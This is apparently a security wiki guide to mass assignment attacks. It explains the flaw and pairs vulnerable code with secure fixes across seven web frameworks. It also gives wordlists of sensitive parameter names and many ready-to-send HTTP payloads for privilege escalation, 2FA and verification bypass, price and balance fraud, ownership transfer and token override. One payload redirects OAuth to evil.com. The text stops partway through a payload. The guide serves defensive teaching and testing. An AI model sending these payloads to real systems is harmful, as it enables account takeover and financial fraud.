---
title: Mass Assignment
description: Complete guide to Mass Assignment attacks — parameter injection, privilege escalation, authentication bypass, framework-specific exploitation, API abuse, automated detection, object manipulation, hidden parameter discovery, real-world attack chains, and defense strategies for penetration testers and security researchers.
navigation:
  icon: i-lucide-boxes
  title: Mass Assignment
---

## What is Mass Assignment?

Mass Assignment is a vulnerability that occurs when an application **automatically binds user-supplied input to internal object properties or database fields** without explicitly defining which fields are allowed. Attackers exploit this by submitting **additional, unexpected parameters** in HTTP requests that map to sensitive internal properties — modifying fields like `role`, `is_admin`, `balance`, `verified`, or `price` that were never intended to be user-controllable.

::callout{icon="i-lucide-info" color="blue"}
Mass Assignment is also known by different names across frameworks: **Autobinding** (Spring MVC), **Object Injection** (generic), **Over-Posting** (ASP.NET), and **Parameter Binding Abuse**. Regardless of the name, the root cause is identical — the application trusts all incoming parameters and binds them to internal data models without filtering.
::

### The Core Problem

Modern web frameworks provide convenience features that automatically map HTTP request parameters to object properties. This "magic" saves development time but creates a dangerous attack surface when developers don't explicitly control which properties can be set by users.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="How Mass Assignment Works"}

  ```text
  USER REGISTRATION FORM                    SERVER-SIDE USER MODEL
  ┌────────────────────┐                   ┌──────────────────────┐
  │ Username: [______] │                   │ username: String     │
  │ Email:    [______] │                   │ email: String        │
  │ Password: [______] │                   │ password: String     │
  │                    │                   │ role: String         │ ← NOT in form
  │ [Register]         │                   │ is_admin: Boolean    │ ← NOT in form
  └────────────────────┘                   │ balance: Float       │ ← NOT in form
         │                                 │ verified: Boolean    │ ← NOT in form
         │                                 │ plan: String         │ ← NOT in form
         ▼                                 └──────────────────────┘
  NORMAL REQUEST:                                    │
  username=john&email=john@x.com&password=pass123    │
                                                     │
  ATTACK REQUEST:                                    ▼
  username=john&email=john@x.com&password=pass123    The framework binds
  &role=admin&is_admin=true&verified=true            ALL parameters to
  &balance=999999&plan=enterprise                    the model — including
                                                     attacker-injected ones
  ```

  The form only shows 3 fields, but the data model has 8 properties. The attacker submits values for hidden properties, and the framework **automatically assigns them** because it doesn't know which fields should be writable.
  :::

  :::tabs-item{icon="i-lucide-code" label="Vulnerable Code — The Pattern"}

  Every vulnerable mass assignment follows this pattern:

  ```text
  1. Application defines a data model with multiple properties
  2. Some properties are user-controllable (username, email)
  3. Some properties are sensitive/internal (role, is_admin, balance)
  4. Framework automatically binds ALL request parameters to the model
  5. No allowlist/blocklist filtering is applied
  6. Attacker submits extra parameters targeting sensitive properties
  7. Sensitive properties are overwritten with attacker-controlled values
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Impact Comparison"}

  | Attack Target | Normal Value | Attacker Value | Impact |
  |--------------|-------------|----------------|--------|
  | `role` | `user` | `admin` | **Full admin access** |
  | `is_admin` | `false` | `true` | **Admin privileges** |
  | `verified` | `false` | `true` | **Email/identity verification bypass** |
  | `email_confirmed` | `false` | `true` | **Account activation bypass** |
  | `balance` | `0` | `999999` | **Financial fraud** |
  | `credits` | `0` | `99999` | **Free credits/resources** |
  | `plan` | `free` | `enterprise` | **Premium feature theft** |
  | `price` | `99.99` | `0.01` | **Price manipulation** |
  | `discount` | `0` | `100` | **Free products** |
  | `password_reset_token` | `null` | `known_token` | **Account takeover** |
  | `two_factor_enabled` | `true` | `false` | **2FA bypass** |
  | `locked` | `true` | `false` | **Account lockout bypass** |
  | `approved` | `false` | `true` | **Workflow bypass** |
  | `user_id` | `self` | `victim_id` | **IDOR / account takeover** |
  | `permissions` | `[read]` | `[read,write,delete,admin]` | **Full permissions** |
  :::
::

---

## Why Mass Assignment is Dangerous

::card-group
  ::card
  ---
  title: Invisible Attack Surface
  icon: i-lucide-eye-off
  ---
  The vulnerability exists in properties that are **not visible** in the UI. Attackers discover hidden model fields through API documentation, error messages, JavaScript source, or blind parameter fuzzing. No malicious characters are needed — only valid parameter names and values.
  ::

  ::card
  ---
  title: Bypasses All Input Validation
  icon: i-lucide-shield-off
  ---
  Mass Assignment doesn't require injection or encoding tricks. The values submitted are **perfectly valid** — `role=admin` is a legitimate string value. WAFs, input filters, and sanitization libraries **cannot detect** this attack because the input is syntactically correct.
  ::

  ::card
  ---
  title: Direct Privilege Escalation
  icon: i-lucide-arrow-up-circle
  ---
  A single request can elevate a regular user to administrator. Unlike other attacks that require chaining multiple vulnerabilities, Mass Assignment provides **immediate, direct privilege escalation** in one step.
  ::

  ::card
  ---
  title: Framework Default Behavior
  icon: i-lucide-wrench
  ---
  Most frameworks enable automatic parameter binding **by default**. Developers must explicitly opt-in to protection. If they forget (or don't know about the risk), every endpoint that accepts user input is potentially vulnerable.
  ::

  ::card
  ---
  title: Widespread Across Technologies
  icon: i-lucide-globe
  ---
  Every major web framework is affected: Ruby on Rails, Django, Laravel, Spring Boot, ASP.NET, Express.js, FastAPI, Flask, and more. The vulnerability pattern is universal across languages and frameworks.
  ::

  ::card
  ---
  title: Difficult to Detect
  icon: i-lucide-scan
  ---
  Automated scanners rarely detect Mass Assignment because it requires understanding the **data model** — which fields exist, which are sensitive, and which are bindable. Only manual testing and source code review reliably find these vulnerabilities.
  ::
::

---

## Vulnerable Code Patterns

::tabs
  :::tabs-item{icon="i-lucide-code" label="Ruby on Rails"}

  ```ruby [User Model — app/models/user.rb]
  class User < ApplicationRecord
    # Model has: username, email, password_digest, role, 
    #            is_admin, verified, plan, balance, api_key
  end
  ```

  ```ruby [VULNERABLE Controller — app/controllers/users_controller.rb]
  class UsersController < ApplicationController
    # VULNERABLE — Accepts ALL parameters
    def create
      @user = User.new(params[:user])
      if @user.save
        redirect_to @user
      else
        render :new
      end
    end

    # VULNERABLE — Updates ALL parameters
    def update
      @user = User.find(params[:id])
      if @user.update(params[:user])
        redirect_to @user
      else
        render :edit
      end
    end
  end
  ```

  ```ruby [SECURE Controller — Using Strong Parameters]
  class UsersController < ApplicationController
    def create
      @user = User.new(user_params)
      # ...
    end

    def update
      @user = current_user
      @user.update(user_params)
      # ...
    end

    private

    def user_params
      # SECURE — Only allows specific parameters
      params.require(:user).permit(:username, :email, :password)
      # role, is_admin, verified, plan, balance are NOT permitted
    end
  end
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python Django"}

  ```python [VULNERABLE — Django ModelForm without fields restriction]
  # models.py
  class User(models.Model):
      username = models.CharField(max_length=100)
      email = models.EmailField()
      password = models.CharField(max_length=128)
      role = models.CharField(max_length=20, default='user')
      is_staff = models.BooleanField(default=False)
      is_superuser = models.BooleanField(default=False)
      balance = models.DecimalField(default=0)
      verified = models.BooleanField(default=False)
      plan = models.CharField(max_length=20, default='free')

  # forms.py — VULNERABLE
  class UserForm(forms.ModelForm):
      class Meta:
          model = User
          fields = '__all__'  # Exposes ALL fields including role, is_staff, etc.
  ```

  ```python [VULNERABLE — Django REST Framework Serializer]
  # serializers.py — VULNERABLE
  class UserSerializer(serializers.ModelSerializer):
      class Meta:
          model = User
          fields = '__all__'  # All fields are writable

  # views.py — VULNERABLE
  class UserViewSet(viewsets.ModelViewSet):
      queryset = User.objects.all()
      serializer_class = UserSerializer

      def create(self, request):
          serializer = self.serializer_class(data=request.data)
          if serializer.is_valid():
              serializer.save()  # Saves ALL submitted fields
              return Response(serializer.data, status=201)
  ```

  ```python [VULNERABLE — Direct dict update]
  # views.py — VULNERABLE
  @app.route('/api/profile', methods=['PUT'])
  def update_profile():
      user = get_current_user()
      # Directly updates model with ALL request data
      for key, value in request.json.items():
          setattr(user, key, value)
      db.session.commit()
      return jsonify({"status": "updated"})
  ```

  ```python [SECURE — Explicit field allowlist]
  # serializers.py — SECURE
  class UserSerializer(serializers.ModelSerializer):
      class Meta:
          model = User
          fields = ['username', 'email', 'password']
          extra_kwargs = {'password': {'write_only': True}}
          read_only_fields = ['is_staff', 'is_superuser', 'role', 'balance', 'verified', 'plan']
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Node.js / Express"}

  ```javascript [VULNERABLE — Mongoose/MongoDB direct assignment]
  const User = require('./models/User');

  // VULNERABLE — Passes all body params to model
  app.post('/api/users', async (req, res) => {
    const user = new User(req.body);
    await user.save();
    res.json(user);
  });

  // VULNERABLE — Updates with all body params
  app.put('/api/users/:id', async (req, res) => {
    const user = await User.findByIdAndUpdate(req.params.id, req.body, { new: true });
    res.json(user);
  });

  // VULNERABLE — Spread operator
  app.put('/api/profile', async (req, res) => {
    const user = await User.findById(req.user.id);
    Object.assign(user, req.body);  // Assigns ALL properties
    await user.save();
    res.json(user);
  });
  ```

  ```javascript [VULNERABLE — Sequelize]
  // VULNERABLE — Creates with all submitted fields
  app.post('/api/users', async (req, res) => {
    const user = await User.create(req.body);
    res.json(user);
  });

  // VULNERABLE — Updates with all submitted fields
  app.put('/api/users/:id', async (req, res) => {
    await User.update(req.body, { where: { id: req.params.id } });
    res.json({ status: 'updated' });
  });
  ```

  ```javascript [SECURE — Explicit field picking]
  const pick = require('lodash/pick');

  app.post('/api/users', async (req, res) => {
    // Only allow specific fields
    const allowedFields = pick(req.body, ['username', 'email', 'password']);
    const user = new User(allowedFields);
    await user.save();
    res.json(user);
  });

  app.put('/api/profile', async (req, res) => {
    const allowedFields = pick(req.body, ['username', 'email', 'bio', 'avatar']);
    await User.findByIdAndUpdate(req.user.id, allowedFields);
    res.json({ status: 'updated' });
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Java Spring"}

  ```java [VULNERABLE — Spring MVC Autobinding]
  // User.java — Model
  public class User {
      private String username;
      private String email;
      private String password;
      private String role;         // sensitive
      private boolean admin;       // sensitive
      private double balance;      // sensitive
      private boolean verified;    // sensitive
      private String plan;         // sensitive
      // getters and setters for ALL fields
  }

  // UserController.java — VULNERABLE
  @RestController
  public class UserController {

      // VULNERABLE — Spring auto-binds ALL request params to User object
      @PostMapping("/register")
      public ResponseEntity<User> register(@ModelAttribute User user) {
          userService.save(user);
          return ResponseEntity.ok(user);
      }

      // VULNERABLE — RequestBody binds all JSON fields
      @PutMapping("/profile")
      public ResponseEntity<User> updateProfile(@RequestBody User user) {
          userService.update(user);
          return ResponseEntity.ok(user);
      }
  }
  ```

  ```java [SECURE — Using DTO (Data Transfer Object)]
  // UserRegistrationDTO.java — Only allowed fields
  public class UserRegistrationDTO {
      @NotBlank
      private String username;
      @Email
      private String email;
      @NotBlank
      private String password;
      // NO role, admin, balance, verified, plan fields
  }

  // UserController.java — SECURE
  @PostMapping("/register")
  public ResponseEntity<User> register(@RequestBody @Valid UserRegistrationDTO dto) {
      User user = new User();
      user.setUsername(dto.getUsername());
      user.setEmail(dto.getEmail());
      user.setPassword(passwordEncoder.encode(dto.getPassword()));
      user.setRole("user");        // Server-set default
      user.setAdmin(false);        // Server-set default
      userService.save(user);
      return ResponseEntity.ok(user);
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="PHP Laravel"}

  ```php [VULNERABLE — Laravel Eloquent]
  <?php
  // User.php Model — VULNERABLE (no $fillable or $guarded)
  class User extends Model
  {
      // Without $fillable or $guarded, ALL fields are mass-assignable
  }

  // UserController.php — VULNERABLE
  class UserController extends Controller
  {
      // VULNERABLE — Creates with all request data
      public function store(Request $request)
      {
          $user = User::create($request->all());
          return response()->json($user, 201);
      }

      // VULNERABLE — Updates with all request data
      public function update(Request $request, $id)
      {
          $user = User::findOrFail($id);
          $user->update($request->all());
          return response()->json($user);
      }
  }
  ```

  ```php [SECURE — Using $fillable whitelist]
  <?php
  // User.php Model — SECURE
  class User extends Model
  {
      // Only these fields can be mass-assigned
      protected $fillable = ['username', 'email', 'password'];

      // OR use $guarded to block specific fields
      // protected $guarded = ['role', 'is_admin', 'balance', 'verified'];
  }

  // UserController.php — SECURE
  class UserController extends Controller
  {
      public function store(Request $request)
      {
          $validated = $request->validate([
              'username' => 'required|string|max:50',
              'email' => 'required|email|unique:users',
              'password' => 'required|min:8',
          ]);
          
          $user = User::create($validated);
          return response()->json($user, 201);
      }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="ASP.NET"}

  ```csharp [VULNERABLE — ASP.NET MVC Over-Posting]
  // User.cs — Model
  public class User
  {
      public int Id { get; set; }
      public string Username { get; set; }
      public string Email { get; set; }
      public string Password { get; set; }
      public string Role { get; set; }         // sensitive
      public bool IsAdmin { get; set; }        // sensitive
      public decimal Balance { get; set; }     // sensitive
      public bool Verified { get; set; }       // sensitive
  }

  // UserController.cs — VULNERABLE
  [HttpPost("register")]
  public IActionResult Register(User user)  // Binds ALL properties
  {
      _context.Users.Add(user);
      _context.SaveChanges();
      return Ok(user);
  }

  [HttpPut("profile")]
  public IActionResult UpdateProfile(User user)
  {
      _context.Users.Update(user);  // Updates ALL properties
      _context.SaveChanges();
      return Ok(user);
  }
  ```

  ```csharp [SECURE — Using [Bind] attribute or ViewModel]
  // UserRegistrationViewModel.cs — Only allowed fields
  public class UserRegistrationViewModel
  {
      [Required]
      public string Username { get; set; }
      [Required, EmailAddress]
      public string Email { get; set; }
      [Required, MinLength(8)]
      public string Password { get; set; }
      // No Role, IsAdmin, Balance, Verified properties
  }

  // Using [Bind] attribute
  [HttpPost("register")]
  public IActionResult Register([Bind("Username,Email,Password")] User user)
  {
      user.Role = "user";       // Server-set
      user.IsAdmin = false;     // Server-set
      _context.Users.Add(user);
      _context.SaveChanges();
      return Ok();
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python FastAPI"}

  ```python [VULNERABLE — FastAPI with Pydantic]
  from pydantic import BaseModel

  # VULNERABLE — Model accepts all fields
  class UserCreate(BaseModel):
      username: str
      email: str
      password: str
      role: str = "user"
      is_admin: bool = False
      balance: float = 0.0
      verified: bool = False
      plan: str = "free"

  @app.post("/register")
  def register(user: UserCreate):
      # Pydantic model accepts role, is_admin, balance if submitted
      db_user = User(**user.dict())
      db.add(db_user)
      db.commit()
      return db_user
  ```

  ```python [SECURE — Separate input/output models]
  # Input model — only allowed fields
  class UserRegisterInput(BaseModel):
      username: str
      email: str
      password: str
      # No role, is_admin, balance, verified, plan

  # Output model — what's returned to client
  class UserResponse(BaseModel):
      id: int
      username: str
      email: str
      plan: str

  @app.post("/register", response_model=UserResponse)
  def register(user: UserRegisterInput):
      db_user = User(
          username=user.username,
          email=user.email,
          password=hash_password(user.password),
          role="user",           # Server-set
          is_admin=False,        # Server-set
          balance=0.0,           # Server-set
          verified=False,        # Server-set
          plan="free"            # Server-set
      )
      db.add(db_user)
      db.commit()
      return db_user
  ```
  :::
::

---

## Detection & Identification

::card-group
  ::card
  ---
  title: API Documentation Analysis
  icon: i-lucide-file-text
  ---
  Review API documentation (Swagger/OpenAPI, Postman collections, GraphQL schema) for model definitions. Compare request schemas with response schemas — any field returned in GET responses but not in POST/PUT request schemas is a potential mass assignment target.
  ::

  ::card
  ---
  title: Response Field Discovery
  icon: i-lucide-search
  ---
  Send a GET request to view a resource. The response reveals ALL model fields. Submit a PUT/PATCH request with those same fields modified. If the server accepts and updates them, mass assignment is confirmed.
  ::

  ::card
  ---
  title: Error Message Analysis
  icon: i-lucide-alert-circle
  ---
  Submit unexpected parameters and analyze error messages. Verbose errors may reveal model field names, types, and validation rules that guide payload crafting.
  ::

  ::card
  ---
  title: JavaScript Source Review
  icon: i-lucide-code
  ---
  Client-side JavaScript often contains model definitions, API schemas, TypeScript interfaces, and GraphQL queries that expose internal field names not shown in the UI.
  ::

  ::card
  ---
  title: Parameter Fuzzing
  icon: i-lucide-radar
  ---
  Use tools like Arjun, Param Miner, or custom wordlists to discover hidden parameters that the model accepts. Submit common property names (`role`, `admin`, `is_admin`, `verified`) and observe behavior changes.
  ::

  ::card
  ---
  title: GraphQL Introspection
  icon: i-lucide-webhook
  ---
  GraphQL introspection queries reveal the complete schema including all fields, types, and mutations. Mutation input types show exactly which fields the API accepts — including potentially sensitive ones.
  ::
::

### Hidden Parameter Discovery

::collapsible
---
label: "Common Sensitive Parameter Names Wordlist"
---

```text [Privilege & Role Parameters]
role
roles
user_role
userRole
user_type
userType
type
group
groups
user_group
permission
permissions
privilege
privileges
access
access_level
accessLevel
access_role
clearance
authorization_level
is_admin
isAdmin
admin
is_staff
isStaff
is_superuser
isSuperuser
is_superadmin
isSuperAdmin
is_moderator
isModerator
is_manager
isManager
is_owner
isOwner
is_root
super
superuser
administrator
moderator
manager
editor
can_edit
canEdit
can_delete
canDelete
can_manage
canManage
can_publish
canPublish
can_admin
canAdmin
read_only
readOnly
write_access
writeAccess
```

```text [Account Status Parameters]
verified
is_verified
isVerified
email_verified
emailVerified
email_confirmed
emailConfirmed
phone_verified
phoneVerified
active
is_active
isActive
enabled
is_enabled
isEnabled
approved
is_approved
isApproved
confirmed
is_confirmed
isConfirmed
locked
is_locked
isLocked
banned
is_banned
isBanned
suspended
is_suspended
isSuspended
activated
is_activated
isActivated
status
account_status
accountStatus
state
```

```text [Financial Parameters]
balance
account_balance
accountBalance
credits
credit
credit_balance
creditBalance
points
loyalty_points
loyaltyPoints
reward_points
rewardPoints
coins
tokens
wallet
wallet_balance
walletBalance
price
unit_price
unitPrice
total
total_price
totalPrice
amount
discount
discount_percent
discountPercent
discount_amount
discountAmount
tax
tax_rate
taxRate
shipping_cost
shippingCost
fee
commission
salary
payment_amount
paymentAmount
refund_amount
refundAmount
```

```text [Subscription & Plan Parameters]
plan
subscription_plan
subscriptionPlan
tier
membership
membership_type
membershipType
account_type
accountType
subscription
subscription_type
subscriptionType
subscription_status
subscriptionStatus
plan_id
planId
plan_type
planType
license
license_type
licenseType
quota
storage_limit
storageLimit
api_limit
apiLimit
rate_limit
rateLimit
features
premium
is_premium
isPremium
is_pro
isPro
trial
is_trial
isTrial
trial_end
trialEnd
trial_expires
trialExpires
expiry
expires_at
expiresAt
```

```text [Security Parameters]
password
password_hash
passwordHash
password_digest
passwordDigest
password_reset_token
passwordResetToken
reset_token
resetToken
api_key
apiKey
api_secret
apiSecret
secret
secret_key
secretKey
auth_token
authToken
access_token
accessToken
refresh_token
refreshToken
session_token
sessionToken
two_factor_enabled
twoFactorEnabled
two_factor_secret
twoFactorSecret
mfa_enabled
mfaEnabled
otp_secret
otpSecret
security_question
securityQuestion
security_answer
securityAnswer
login_attempts
loginAttempts
last_login
lastLogin
```

```text [Metadata & Internal Parameters]
id
_id
user_id
userId
owner_id
ownerId
created_at
createdAt
updated_at
updatedAt
created_by
createdBy
updated_by
updatedBy
deleted
is_deleted
isDeleted
deleted_at
deletedAt
internal
is_internal
isInternal
test
is_test
isTest
debug
is_debug
isDebug
hidden
is_hidden
isHidden
private
is_private
isPrivate
org_id
orgId
organization_id
organizationId
tenant_id
tenantId
team_id
teamId
department
department_id
departmentId
company_id
companyId
parent_id
parentId
```
::

### Discovery Through API Responses

::steps{level="4"}

#### GET Request — Discover All Fields

```http
GET /api/users/me HTTP/1.1
Host: target.com
Authorization: Bearer USER_TOKEN
```

**Response reveals all model fields:**

```json
{
  "id": 1001,
  "username": "regular_user",
  "email": "user@target.com",
  "role": "user",
  "is_admin": false,
  "verified": true,
  "plan": "free",
  "balance": 0,
  "credits": 100,
  "permissions": ["read"],
  "two_factor_enabled": true,
  "created_at": "2024-01-15T10:30:00Z",
  "api_key": "ak-xxx-hidden"
}
```

#### PUT/PATCH Request — Test Mass Assignment

Submit a request modifying the sensitive fields discovered in the GET response:

```http
PUT /api/users/me HTTP/1.1
Host: target.com
Authorization: Bearer USER_TOKEN
Content-Type: application/json

{
  "username": "regular_user",
  "role": "admin",
  "is_admin": true,
  "plan": "enterprise",
  "balance": 999999,
  "credits": 999999,
  "permissions": ["read", "write", "delete", "admin"],
  "two_factor_enabled": false,
  "verified": true
}
```

#### GET Request — Verify Changes

```http
GET /api/users/me HTTP/1.1
Host: target.com
Authorization: Bearer USER_TOKEN
```

If any sensitive fields changed, mass assignment is confirmed.

::

---

## Payloads & Attack Techniques

::note
Mass Assignment payloads are **valid parameter names and values** — not injection strings. The attack relies on submitting parameters the application doesn't expect. Payloads are organized by attack objective.
::

### Privilege Escalation Payloads

::collapsible
---
label: "Role & Permission Escalation"
---

```http [Registration — Inject Admin Role]
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "role": "admin"
}
```

```http [Registration — Multiple Role Formats]
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "role": "admin",
  "Role": "admin",
  "user_role": "admin",
  "userRole": "admin",
  "user_type": "administrator",
  "type": "admin"
}
```

```http [Registration — Boolean Admin Flag]
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "is_admin": true,
  "isAdmin": true,
  "admin": true,
  "is_staff": true,
  "is_superuser": true
}
```

```http [Registration — Numeric Privilege Level]
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "access_level": 10,
  "privilege": 999,
  "user_level": 0,
  "clearance": "top_secret"
}
```

```http [Profile Update — Permission Array Injection]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "username": "attacker",
  "permissions": ["read", "write", "delete", "manage_users", "admin", "superadmin"],
  "scopes": ["user:read", "user:write", "admin:read", "admin:write", "system:manage"]
}
```

```http [Profile Update — Group/Role Array]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "groups": ["users", "administrators", "super-admins"],
  "roles": ["user", "moderator", "admin", "owner"]
}
```

```http [URL-Encoded — Form POST]
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@evil.com&password=pass123&role=admin&is_admin=1&verified=1
```

```http [Multipart Form — With Hidden Fields]
POST /register HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="username"
attacker
------boundary
Content-Disposition: form-data; name="email"
attacker@evil.com
------boundary
Content-Disposition: form-data; name="password"
password123
------boundary
Content-Disposition: form-data; name="role"
admin
------boundary
Content-Disposition: form-data; name="is_admin"
true
------boundary--
```
::

### Account Status Manipulation

::collapsible
---
label: "Verification & Account State Bypass"
---

```http [Bypass Email Verification]
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "verified": true,
  "email_verified": true,
  "email_confirmed": true,
  "is_verified": true,
  "is_confirmed": true,
  "activated": true,
  "is_active": true,
  "status": "active",
  "account_status": "verified"
}
```

```http [Bypass Phone Verification]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "phone": "+1234567890",
  "phone_verified": true,
  "phone_confirmed": true,
  "sms_verified": true
}
```

```http [Unlock Locked Account]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "locked": false,
  "is_locked": false,
  "login_attempts": 0,
  "failed_attempts": 0,
  "lockout_until": null,
  "locked_at": null,
  "account_locked": false
}
```

```http [Unban Suspended Account]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "banned": false,
  "is_banned": false,
  "suspended": false,
  "is_suspended": false,
  "ban_reason": null,
  "ban_expires": null,
  "status": "active"
}
```

```http [Disable Two-Factor Authentication]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "two_factor_enabled": false,
  "twoFactorEnabled": false,
  "mfa_enabled": false,
  "otp_required": false,
  "2fa_enabled": false,
  "totp_secret": null,
  "otp_secret": null
}
```

```http [Skip KYC / Identity Verification]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "kyc_verified": true,
  "identity_verified": true,
  "document_verified": true,
  "kyc_status": "approved",
  "verification_level": 3
}
```
::

### Financial Manipulation

::collapsible
---
label: "Balance, Credits & Pricing Manipulation"
---

```http [Inject Account Balance]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "balance": 999999.99,
  "account_balance": 999999.99,
  "wallet_balance": 999999.99,
  "available_balance": 999999.99
}
```

```http [Inject Credits/Points]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "credits": 999999,
  "points": 999999,
  "loyalty_points": 999999,
  "reward_points": 999999,
  "coins": 999999,
  "tokens": 999999
}
```

```http [Product Price Manipulation]
PUT /api/products/100 HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "name": "Laptop",
  "price": 0.01,
  "sale_price": 0.01,
  "cost": 0.01,
  "msrp": 0.01
}
```

```http [Cart Item Price Override]
POST /api/cart/items HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "product_id": 100,
  "quantity": 1,
  "price": 0.01,
  "unit_price": 0.01,
  "line_total": 0.01,
  "discount": 99.99,
  "discount_percent": 100,
  "tax": 0,
  "shipping": 0
}
```

```http [Order Total Override]
POST /api/orders HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "items": [{"product_id": 100, "quantity": 1}],
  "total": 0.01,
  "subtotal": 0.01,
  "grand_total": 0.01,
  "amount_due": 0.01,
  "tax_amount": 0,
  "shipping_amount": 0
}
```

```http [Subscription Plan Upgrade]
PUT /api/subscription HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "plan": "enterprise",
  "plan_id": "plan_enterprise_yearly",
  "tier": "enterprise",
  "subscription_type": "enterprise",
  "billing_amount": 0,
  "next_billing_date": "2099-12-31",
  "trial_end": "2099-12-31",
  "features": ["unlimited_users", "api_access", "priority_support", "custom_branding"]
}
```

```http [Gift Card Value Manipulation]
POST /api/giftcards HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "recipient_email": "attacker@evil.com",
  "message": "Gift card",
  "amount": 0.01,
  "value": 10000,
  "face_value": 10000
}
```
::

### Ownership & Association Manipulation

::collapsible
---
label: "User ID, Organization & Tenant Manipulation"
---

```http [Change Resource Owner]
PUT /api/documents/500 HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "title": "My Document",
  "owner_id": 1,
  "user_id": 1,
  "author_id": 1,
  "created_by": 1
}
```

```http [Change Organization / Tenant]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "org_id": "target_org_id",
  "organization_id": "target_org_id",
  "tenant_id": "target_tenant_id",
  "team_id": "admin_team_id",
  "company_id": "target_company_id",
  "department": "executive"
}
```

```http [Associate with Admin Group]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "group_ids": [1, 2, 3],
  "team_ids": [1],
  "department_id": 1,
  "manager_id": null,
  "reports_to": null
}
```

```http [Transfer Ownership of Resource]
PUT /api/projects/100 HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "name": "Critical Project",
  "owner": "attacker_username",
  "owner_id": "attacker_user_id",
  "admin_ids": ["attacker_user_id"],
  "member_ids": ["attacker_user_id"]
}
```
::

### Security Token & Credential Manipulation

::collapsible
---
label: "Token, API Key & Password Manipulation"
---

```http [Override API Key]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "api_key": "attacker_controlled_api_key",
  "api_secret": "attacker_controlled_secret",
  "access_token": "attacker_controlled_token"
}
```

```http [Reset Password Token Injection]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "password_reset_token": "known_token_value",
  "reset_token": "known_token_value",
  "reset_token_expires": "2099-12-31T23:59:59Z"
}
```

```http [Direct Password Change (Bypassing Current Password Check)]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "username": "target_user",
  "password": "new_password_set_by_attacker",
  "password_hash": "$2b$12$attacker_controlled_hash",
  "password_digest": "attacker_controlled_digest"
}
```

```http [Session / Auth Token Manipulation]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "session_token": "admin_session_token",
  "auth_token": "admin_auth_token",
  "refresh_token": "admin_refresh_token"
}
```

```http [OAuth Application Scope Escalation]
PUT /api/oauth/applications/100 HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "name": "My App",
  "redirect_uri": "https://evil.com/callback",
  "scopes": ["read", "write", "admin", "delete_users", "manage_billing"],
  "grant_types": ["authorization_code", "client_credentials"],
  "trusted": true,
  "first_party": true
}
```
::

### Workflow & State Manipulation

::collapsible
---
label: "Approval, Status & Timestamp Manipulation"
---

```http [Skip Approval Process]
POST /api/requests HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "title": "Expense Report",
  "amount": 50000,
  "status": "approved",
  "approved": true,
  "approved_by": "admin_user_id",
  "approved_at": "2024-01-15T10:00:00Z"
}
```

```http [Override Order Status]
PUT /api/orders/5000 HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "status": "delivered",
  "payment_status": "paid",
  "fulfillment_status": "fulfilled",
  "tracking_number": "FAKE123",
  "shipped_at": "2024-01-15T10:00:00Z",
  "delivered_at": "2024-01-15T12:00:00Z"
}
```

```http [Backdate Timestamp]
PUT /api/entries/100 HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "content": "Modified entry",
  "created_at": "2020-01-01T00:00:00Z",
  "updated_at": "2020-01-01T00:00:00Z",
  "published_at": "2020-01-01T00:00:00Z"
}
```

```http [Extend Trial Period]
PUT /api/subscription HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
